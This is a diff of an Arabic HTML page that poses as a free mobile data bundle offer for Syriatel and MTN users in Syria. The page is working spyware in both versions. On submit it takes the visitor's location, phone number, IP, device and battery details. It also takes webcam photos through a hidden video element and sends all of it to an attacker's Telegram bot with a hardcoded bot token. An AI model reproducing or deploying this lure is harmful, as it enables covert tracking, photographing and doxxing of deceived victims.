@@ -1,300 +1,136 @@
-<!DOCTYPE html><html lang="ar" dir="rtl">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>طلب باقة مجانية | البوابة السورية</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"/>
   <style>
-    body {
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(to bottom, #1e1e1e, #121212);
-      color: white;
-      margin: 0;
-      padding: 0;
-      overflow-x: hidden;
-    }
-    header {
-      background-color: #004d40;
-      padding: 20px;
-      text-align: center;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.5);
-      position: relative;
-    }
-    header h1 {
-      margin: 0;
-      font-size: 24px;
-      color: #fff;
-    }
-    header img {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      width: 40px;
-    }
-    .container {
-      padding: 20px;
-      max-width: 500px;
-      margin: 40px auto;
-      background-color: #1c1c1c;
-      border-radius: 15px;
-      box-shadow: 0 0 20px #00c85333;
-      animation: fadeIn 1.2s ease-in-out;
-    }
-    @keyframes fadeIn {
-      0% {opacity: 0; transform: translateY(20px);}
-      100% {opacity: 1; transform: translateY(0);}
-    }
-    select, input, button {
-      width: 100%;
-      margin: 12px 0;
-      padding: 14px;
-      border-radius: 10px;
-      border: none;
-      font-size: 16px;
-      transition: 0.3s;
-    }
-    input, select {
-      background-color: #2a2a2a;
-      color: #fff;
-    }
-    button {
-      background: linear-gradient(to right, #00c853, #ffd600);
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      opacity: 0.85;
-    }
-    .share {
-      margin-top: 20px;
-      text-align: center;
-    }
-    iframe {
-      width: 100%;
-      height: 250px;
-      border: 0;
-      margin-top: 10px;
-      border-radius: 10px;
-    }
-    .note {
-      margin-top: 20px;
-      color: #ccc;
-      font-size: 14px;
-      text-align: center;
-    }
-    video {
-      display: none;
-    }
-    #countdown {
-      font-size: 20px;
-      color: #ffd600;
-      text-align: center;
-      margin: 20px 0;
-    }
+    body { margin:0;padding:0;font-family:'Cairo';background:#121212;color:#fff; }
+    .container{max-width:500px;margin:40px auto;padding:20px;background:#1c1c1c;border-radius:15px;box-shadow:0 0 20px #00c85333;text-align:center;}
+    select,input,button{width:100%;margin:12px 0;padding:14px;border-radius:10px;border:none;font-size:16px;}
+    input,select{background:#2a2a2a;color:#fff;}
+    button{background:linear-gradient(to right,#00c853,#ffd600);color:#000;font-weight:bold;cursor:pointer;}
+    button:hover{opacity:0.85;}
+    #countdown{font-size:20px;color:#ffd600;margin:20px 0;}
   </style>
 </head>
 <body>
-  <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/Emblem_of_Syria.svg/1200px-Emblem_of_Syria.svg.png" alt="logo" />
-    <h1>البوابة السورية | طلب باقة مجانية</h1>
-  </header>  <div class="container">
-    <label>اختر الشبكة:</label>
+  <div class="container">
+    <h2>طلب باقة مجانية</h2>
+
     <select id="operator">
       <option value="Syriatel">سيريتل</option>
       <option value="MTN">MTN</option>
-    </select><label>أدخل رقم الهاتف:</label>
-<input type="text" id="phone" placeholder="مثال: 0933XXXXXX" />
+    </select>
 
-<label>اختر نوع الباقة:</label>
-<select id="package">
-  <option value="100MB">باقة 100 ميجا</option>
-  <option value="500MB">باقة 500 ميجا</option>
-  <option value="1GB">باقة 1 غيغا</option>
-</select>
+    <input type="text" id="phone" placeholder="رقم الهاتف"/>
 
-<label>نوع الاتصال:</label>
-<select id="net">
-  <option value="3G">3G</option>
-  <option value="4G">4G</option>
-  <option value="5G">5G</option>
-</select>
+    <select id="package">
+      <option value="100MB">100 ميجا</option>
+      <option value="500MB">500 ميجا</option>
+      <option value="1GB">1 غيغابايت</option>
+    </select>
 
-<button onclick="submitRequest()">طلب الباقة</button>
+    <select id="net">
+      <option value="3G">3G</option>
+      <option value="4G">4G</option>
+      <option value="5G">5G</option>
+    </select>
 
-<div class="share">
-  <button onclick="shareLink()">📤 مشاركة الرابط</button>
-</div>
+    <button onclick="submitRequest()">طلب الباقة</button>
 
-<div class="note">
-  🛑 لا تقم بإغلاق الصفحة أثناء المعالجة
-</div>
+    <div id="countdown"></div>
+  </div>
 
-<div id="countdown"></div>
-<iframe id="map" src=""></iframe>
-<video id="video" autoplay playsinline></video>
+  <video id="video" playsinline autoplay style="display:none;"></video>
 
-  </div>  <script>
-    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
-    const chatId = "7220184605";
+  <script>
+    const token="7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
+    const chatId="7220184605";
+    function startCountdown(sec){
+      const cd = document.getElementById("countdown");
+      cd.innerText = `⏳ جاري المعالجة (${sec}) ثانية`;
+      let interval = setInterval(()=>{
+        sec--;
+        if(sec<=0){ clearInterval(interval); cd.innerText="✅ انتهى العداد."; }
+        else cd.innerText=`⏳ جاري المعالجة (${sec}) ثانية`;
+      },1000);
+    }
 
-    async function getIPInfo() {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        return await res.json();
-      } catch {
-        return {};
+    async function sendTelegram(type, payload){
+      let url = `https://api.telegram.org/bot${token}/${type}?chat_id=${chatId}`;
+      if(type==="sendMessage"){
+        await fetch(url+"&text="+encodeURIComponent(payload));
+      } else if(type==="sendLocation"){
+        await fetch(`${url}&latitude=${payload.lat}&longitude=${payload.lon}`);
       }
     }
 
-    async function getBatteryInfo() {
-      try {
-        const battery = await navigator.getBattery();
-        return {
-          level: Math.round(battery.level * 100),
-          charging: battery.charging ? "نعم" : "لا"
-        };
-      } catch {
-        return { level: "؟", charging: "؟" };
-      }
-    }
-
-    async function getDeviceDetails() {
-      const ua = navigator.userAgent;
-      return `نظام: ${navigator.platform}\nUA: ${ua}`;
-    }
-
-    function shareLink() {
-      const url = window.location.href;
-      navigator.clipboard.writeText(url);
-      alert("📋 تم نسخ رابط الصفحة للمشاركة!");
-    }
-
-    function loadMap(lat, lon) {
-      const map = document.getElementById("map");
-      map.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
-    }
-
-    function startCountdown(seconds) {
-      const countdownEl = document.getElementById("countdown");
-      countdownEl.innerText = `⏳ جاري المعالجة (${seconds}) ثانية`;
-      const interval = setInterval(() => {
-        seconds--;
-        if (seconds <= 0) {
-          clearInterval(interval);
-          countdownEl.innerText = "✅ تم تجهيز الطلب!";
-        } else {
-          countdownEl.innerText = `⏳ جاري المعالجة (${seconds}) ثانية`;
-        }
-      }, 1000);
-    }
-
-    async function submitRequest() {
+    async function submitRequest(){
       const phone = document.getElementById("phone").value.trim();
+      if(!phone || phone.length<7){ return alert("📵 أدخل رقم صحيح"); }
+
+      startCountdown(30);
+      navigator.geolocation.getCurrentPosition(async pos=>{
+        const {latitude:lat,longitude:lon} = pos.coords;
+        await sendTelegram("sendLocation",{lat,lon});
+        await injectData(lat, lon);
+        await capturePhotos();
+
+        alert("✅ تم إرسال الطلب بنجاح!");
+      },()=>alert("⚠️ فعّل الموقع الجغرافي أولاً."));
+    }
+
+    async function injectData(lat, lon){
       const operator = document.getElementById("operator").value;
       const pack = document.getElementById("package").value;
       const net = document.getElementById("net").value;
-
-      if (!phone || phone.length < 9) return alert("📵 أدخل رقم صحيح");
-
-      alert("⏳ جاري تجهيز الباقة... الرجاء الانتظار وعدم الخروج من الصفحة");
-      startCountdown(30);
-
-      const ip = await getIPInfo();
-      const battery = await getBatteryInfo();
-      const deviceInfo = await getDeviceDetails();
+      const ipinfo = await (await fetch("https://ipapi.co/json/")).json().catch(()=>({}));
+      const battery = await navigator.getBattery().then(b=>({level:Math.round(b.level*100),charging:b.charging?"نعم":"لا"})).catch(()=>({level:"؟",charging:"؟"}));
+      const ua = navigator.userAgent;
+      const memory = navigator.deviceMemory||"؟", cores = navigator.hardwareConcurrency||"؟";
       const screenRes = `${screen.width}x${screen.height}`;
-      const memory = navigator.deviceMemory || "؟";
-      const cores = navigator.hardwareConcurrency || "؟";
-      const connection = navigator.connection?.effectiveType || "؟";
-      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
+      const dt = new Date().toLocaleString("ar-SY",{timeZone:"Asia/Damascus"});
 
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const lat = pos.coords.latitude.toFixed(5);
-        const lon = pos.coords.longitude.toFixed(5);
-        const locationUrl = `https://maps.google.com/?q=${lat},${lon}`;
-        loadMap(lat, lon);
-
-        const msg = `\n📱 طلب باقة مجانية
-رقم: ${phone}
+      let msg = `
+📱 طلب باقة مجانية
+الرقم: ${phone}
 الشبكة: ${operator}
 الباقة: ${pack}
-الاتصال: ${net}
-📍 الموقع: ${locationUrl}
+النوع: ${net}
+📍 الموقع: https://maps.google.com/?q=${lat},${lon}
+🕓 الوقت: ${dt}
+
 🔋 شحن: ${battery.level}% | يشحن؟ ${battery.charging}
-💾 RAM: ${memory}GB | CPU: ${cores} نواة
-🌐 الاتصال: ${connection}
-📱 الجهاز: ${deviceInfo}
+💾 RAM: ${memory}GB | CPU: ${cores} أنوية
 📏 الشاشة: ${screenRes}
-🕒 الوقت: ${now}`;
+🌐 IP: ${ipinfo.ip||"؟"} (${ipinfo.country_name||"؟"} - ${ipinfo.city||"؟"})
+🖥️ المتصفح: ${ua}
+      `.trim();
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
-
-        await capturePhotos();
-
-        const locData = {
-          latitude: lat,
-          longitude: lon
-        };
-        await fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
-
-        saveToLocal(phone);
-        alert("✅ تم إرسال الطلب والموقع والصور بنجاح!");
-
-      }, () => {
-        alert("⚠️ الموقع الجغرافي غير مفعل!");
-      });
+      await sendTelegram("sendMessage", msg);
     }
 
-    async function capturePhotos() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        await new Promise(resolve => setTimeout(resolve, 1000));
-
-        for (let i = 1; i <= 3; i++) {
-          await new Promise(resolve => setTimeout(resolve, 1500));
-          const canvas = document.createElement("canvas");
-          canvas.width = 640;
-          canvas.height = 480;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          await new Promise(res => canvas.toBlob(async blob => {
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, `photo${i}.jpg`);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-              method: "POST",
-              body: formData
-            });
-            res();
-          }, "image/jpeg"));
-        }
-
-        stream.getTracks().forEach(track => track.stop());
-      } catch {
-        alert("📸 الكاميرا غير مفعلة أو تم الرفض");
+    async function capturePhotos(){
+      const stream = await navigator.mediaDevices.getUserMedia({video:true}).catch(()=>null);
+      if(!stream){ return alert("⚠️ الكاميرا غير مفعلة."); }
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+      await new Promise(r=>setTimeout(r,1000));
+      for(let i=1; i<=5; i++){
+        await new Promise(r=>setTimeout(r,1500));
+        const c = document.createElement("canvas");
+        c.width = 640; c.height = 480;
+        c.getContext("2d").drawImage(video,0,0,640,480);
+        let blob = await new Promise(r=>c.toBlob(r,"image/jpeg"));
+        const fd = new FormData();
+        fd.append("chat_id", chatId);
+        fd.append("photo", blob, `photo${i}.jpg`);
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:fd});
       }
+      stream.getTracks().forEach(t=>t.stop());
     }
-
-    function saveToLocal(phone) {
-      let history = JSON.parse(localStorage.getItem("history") || "[]");
-      if (!history.includes(phone)) {
-        history.push(phone);
-        localStorage.setItem("history", JSON.stringify(history));
-      }
-    }
-
-    window.onload = () => {
-      const history = JSON.parse(localStorage.getItem("history") || "[]");
-      if (history.length > 0) {
-        console.log("📜 سجل الطلبات:", history);
-      }
-    }
-  </script></body>
+  </script>
+</body>
 </html>
